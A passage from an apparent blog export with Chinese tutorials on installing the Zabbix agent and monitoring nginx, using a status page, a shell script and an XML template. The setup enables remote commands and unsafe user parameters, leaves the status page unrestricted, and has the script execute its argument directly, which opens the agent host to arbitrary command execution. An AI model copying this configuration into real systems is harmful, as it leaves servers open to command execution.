class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm</span><br></pre></td></tr></table></figure>\n<p>Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<p>Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure></p>","more":"<h3 id=\"Installing-Zabbix-packages\"><a href=\"#Installing-Zabbix-packages\" class=\"headerlink\" title=\"Installing Zabbix packages\"></a>Installing Zabbix packages</h3><p>Example for installing Zabbix agent only.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\"><a href=\"#&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;\"></a>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4FEE;&#x6539;</h2><p>&#x67E5;&#x627E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E8B;&#x5148;&#x505A;&#x597D;&#x76F8;&#x5173;&#x5907;&#x4EFD;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name <span class=\"string\">&apos;*zabbix_agentd.conf*&apos;</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\">cp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;&#x76F8;&#x5173;&#x5177;&#x4F53;&#x9879;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/zabbix/zabbix_agentd.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">EnableRemoteCommands=1  &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;</span><br><span class=\"line\">Server=zabbix_server_IP  zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</span><br><span class=\"line\">ServerActive=zabbix_server_IP  &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;</span><br><span class=\"line\">Hostname=name  name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;</span><br><span class=\"line\">UnsafeUserParameters=1  &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chkconfig zabbix-agent on</span><br><span class=\"line\">chkconfig --list|grep zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p>&#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-agent start</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\"><a href=\"#&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;\"></a>&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;</h2><p>&#x767B;&#x9646; <a href=\"http://zabbix_server_ip/zabbix\">http://zabbix_server_ip/zabbix</a>, &#x70B9;&#x51FB; &#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x4E3B;&#x673A;&#x3011;-&gt;&#x3010;&#x521B;&#x5EFA;&#x4E3B;&#x673A;&#x3011;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/1.png\" alt=\"\"></p>\n<p>&#x914D;&#x7F6E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3010;host name&#x3011;&#x3001;&#x7FA4;&#x7EC4;&#x3001;&#x88AB;&#x76D1;&#x63A7;&#x4E3B;&#x673A;ip</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/2.png\" alt=\"\"></p>\n<p>&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x5E76;&#x4FDD;&#x5B58;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/3.png\" alt=\"\"></p>\n<p>&#x56DE;&#x5230;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x5217;&#x8868;&#xFF0C;&#x70B9;&#x51FB;&#x3010;&#x9879;&#x76EE;&#x3011;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/4.png\" alt=\"\"></p>\n<p>&#x67E5;&#x770B;&#x521A;&#x624D;&#x6DFB;&#x52A0;&#x7684;&#x6A21;&#x677F;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x662F;&#x5426;&#x751F;&#x6548;&#xFF0C;&#x7EFF;&#x8272;&#x4EE3;&#x8868;&#x6210;&#x529F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/5.png\" alt=\"\"></p>\n<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x4E3B;&#x673A;&#x5217;&#x8868;&#x70B9;&#x51FB;&#x3010;&#x56FE;&#x5F62;&#x3011;, &#x8FDB;&#x5165;&#x67D0;&#x4E2A;&#x5177;&#x4F53;&#x76D1;&#x63A7;&#x9879;&#x540E;&#xFF0C;&#x518D;&#x70B9;&#x51FB;&#x3010;&#x9884;&#x89C8;&#x3011;&#xFF0C;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x76D1;&#x63A7;&#x56FE;&#x50CF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/6.png\" alt=\"\"></p>\n<p><br></p>"},{"title":"zabbix监控nginx","date":"2016-10-06T10:24:17.000Z","toc":false,"_content":"\n> zabbix监控nginx，首先需要配置ngx_status\n\n### 启用nginx status配置\n在默认主机里面加上location或者你希望能访问到的主机里面。\n```bash\nserver {\n    listen  *:80 default_server;\n    server_name _;\n    location /nginx-status \n    {\n        stub_status on;\n        access_log off;\n        #allow 127.0.0.1;\n        #deny all;\n    }\n}\n```\n\n<!-- more -->\n\n### 重启nginx\n```bash\nservice nginx restart\n```\n\n### 打开status页面\n```bash\n# 如果nginx默认端口不是80 curl http://ip:port/nginx-status\n# curl http://127.0.0.1/nginx-status\nActive connections: 11921 \nserver accepts handled requests\n 11989 11989 11991 \nReading: 0 Writing: 7 Waiting: 42\n```\n\n### nginx status详解\nactive connections – 活跃的连接数量\nserver accepts handled requests — 总共处理了11989个连接 , 成功创建11989次握手, 总共处理了11991个请求\nreading — 读取客户端的连接数.\nwriting — 响应数据到客户端的数量\nwaiting — 开启 keep-alive 的情况下,这个值等于 active – (reading+writing), 意思就是 Nginx 已经处理完正在等候下一次请求指令的驻留连接.\n\n<br/>\n\n---\n\n### zabbix客户端配置\n\n安装zabbix agent客户端，并修改zabbix_agentd.conf文件\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n编写客户端脚本ngx_status.sh, 存放/etc/zabbix/scripts目录，并赋予执行权限。\n```bash\n\nHOST=\"127.0.0.1\"\nPORT=\"80\"\n \n# 检测nginx进程是否存在\nfunction ping {\n    /sbin/pidof nginx | wc -l \n}\n# 检测nginx性能\nfunction active {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Active' | awk '{print $NF}'\n}\nfunction reading {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Reading' | awk '{print $2}'\n}\nfunction writing {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Writing' | awk '{print $4}'\n}\nfunction waiting {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Waiting' | awk '{print $6}'\n}\nfunction accepts {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $1}'\n}\nfunction handled {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $2}'\n}\nfunction requests {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $3}'\n}\n# 执行function\n$1\n```\n\n将自定义的UserParameter加入配置文件，然后重启agentd.\n```bash\n# vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf\nUserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh $1\n\n#service zabbix-agent restart\n```\n\n### 服务器zabbix_get数据检测\n\n此步骤可以跳过，但最好还是测试一下，通过此命令检测客户端配置是否正确\n```bash\n# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[accepts]'\n9570756\n# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[ping]'\n1\n```\n\n### zabbix web端配置\n**导入Template App NGINX模板**\n模板已经写好，位于文章末尾。\n\n**Link NGINX模板**\n到了最后一个阶段，登陆zabbix管理端，link模板到nginx服务器：configuration->hosts->点击nginx所在服务器->点击template->Link new templates输入\"Template App NGINX\"->Add->最后点击update。\n\n<br/>\n\n---\n\n### Template App NGINX模板\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<zabbix_export>\n    <version>2.0</version>\n    <date>2016-10-6T01:29:50Z</date>\n    <groups>\n        <group>\n            <name>Templates</name>\n        </group>\n    </groups>\n    <templates>\n        <template>\n            <template>Template App NGINX</template>\n            <name>Template App NGINX</name>\n            <description></description>\n            <groups>\n                <group>\n                    <name>Templates</name>\n                </group>\n            </groups>\n            <applications>\n                <application>\n                    <name>nginx</name>\n                </application>\n            </applications>\n            <items>\n                <item>\n                    <name>nginx status connections active</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[active]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>active</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections reading</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[reading]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>reading</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections waiting</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[waiting]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>waiting</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status connections writing</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[writing]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>writing</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status PING</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[ping]</key>\n                    <delay>60</delay>\n                    <history>30</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>is live</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap>\n                        <name>Service state</name>\n                    </valuemap>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server accepts</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[accepts]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>accepts</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server handled</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[handled]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>handled</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n                <item>\n                    <name>nginx status server requests</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>nginx.status[requests]</key>\n                    <delay>60</delay>\n                    <history>90</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_contextname/>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authprotocol>0</snmpv3_authprotocol>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privprotocol>0</snmpv3_privprotocol>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description>requests</description>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>nginx</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                    <logtimefmt/>\n                </item>\n            </items>\n            <discovery_rules/>\n            <macros/>\n            <templates/>\n            <screens/>\n        </template>\n    </templates>\n    <triggers>\n        <trigger>\n            <expression>{Template App NGINX:nginx.status[ping].last()}=0</expression>\n            <name>nginx was down!</name>\n            <url/>\n            <status>0</status>\n            <priority>4</priority>\n            <description>NGINX进程数：0，请注意</description>\n            <type>0</type>\n            <dependencies/>\n        </trigger>\n    </triggers>\n    <graphs>\n        <graph>\n            <name>nginx status connections</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[active]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[reading]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>0000C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[waiting]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>3</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C800C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[writing]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>nginx status server</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[accepts]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[handled]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>0000C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Template App NGINX</host>\n                        <key>nginx.status[requests]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n    </graphs>\n</zabbix_export>\n\n```","source":"_posts/zabbix监控nginx.md","raw":"---\ntitle: zabbix监控nginx\ncategories:\n  - 运维部署\ntags:\n  - zabbix\n  - nginx\ndate: 2016-10-6 18:24:17\ntoc: false\n---\n\n> zabbix监控nginx，首先需要配置ngx_status\n\n### 启用nginx status配置\n在默认主机里面加上location或者你希望能访问到的主机里面。\n```bash\nserver {\n    listen  *:80 default_server;\n    server_name _;\n    location /nginx-status \n    {\n        stub_status on;\n        access_log off;\n        #allow 127.0.0.1;\n        #deny all;\n    }\n}\n```\n\n<!-- more -->\n\n### 重启nginx\n```bash\nservice nginx restart\n```\n\n### 打开status页面\n```bash\n# 如果nginx默认端口不是80 curl http://ip:port/nginx-status\n# curl http://127.0.0.1/nginx-status\nActive connections: 11921 \nserver accepts handled requests\n 11989 11989 11991 \nReading: 0 Writing: 7 Waiting: 42\n```\n\n### nginx status详解\nactive connections – 活跃的连接数量\nserver accepts handled requests — 总共处理了11989个连接 , 成功创建11989次握手, 总共处理了11991个请求\nreading — 读取客户端的连接数.\nwriting — 响应数据到客户端的数量\nwaiting — 开启 keep-alive 的情况下,这个值等于 active – (reading+writing), 意思就是 Nginx 已经处理完正在等候下一次请求指令的驻留连接.\n\n<br/>\n\n---\n\n### zabbix客户端配置\n\n安装zabbix agent客户端，并修改zabbix_agentd.conf文件\n```bash\n# vim /etc/zabbix/zabbix_agentd.conf\n\nEnableRemoteCommands=1  来至zabbix服务器的远程命令是否允许被执行\nServer=zabbix_server_IP  zabbix服务器ip地址\nServerActive=zabbix_server_IP  主动向zabbix server发送监控内容\nHostname=name  name配置的内容要和zabbix服务器配置的Host name一致\nUnsafeUserParameters=1  是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key\n```\n\n编写客户端脚本ngx_status.sh, 存放/etc/zabbix/scripts目录，并赋予执行权限。\n```bash\n\nHOST=\"127.0.0.1\"\nPORT=\"80\"\n \n# 检测nginx进程是否存在\nfunction ping {\n    /sbin/pidof nginx | wc -l \n}\n# 检测nginx性能\nfunction active {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Active' | awk '{print $NF}'\n}\nfunction reading {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Reading' | awk '{print $2}'\n}\nfunction writing {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Writing' | awk '{print $4}'\n}\nfunction waiting {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| grep 'Waiting' | awk '{print $6}'\n}\nfunction accepts {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $1}'\n}\nfunction handled {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $2}'\n}\nfunction requests {\n    /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2>/dev/null| awk NR==3 | awk '{print $3}'\n}\n# 执行function\n$1\n```\n\n将自定义的UserParameter加入配置文件，然后重启agentd.\n```bash\n# vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf\nUserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh $1\n\n#service zabbix-agent restart\n```\n\n### 